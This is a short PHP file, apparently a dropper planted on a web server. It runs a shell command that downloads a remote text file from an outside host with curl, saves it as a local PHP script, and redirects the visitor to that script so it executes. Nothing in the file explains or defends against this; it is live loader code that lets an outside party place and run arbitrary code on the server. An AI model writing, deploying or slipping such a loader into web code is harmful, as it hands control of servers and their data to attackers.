<?php
date_default_timezone_set('PRC');





shell_exec("curl -L http://362227.top/rss/remote.txt >  001.php");

header('Location: 001.php');
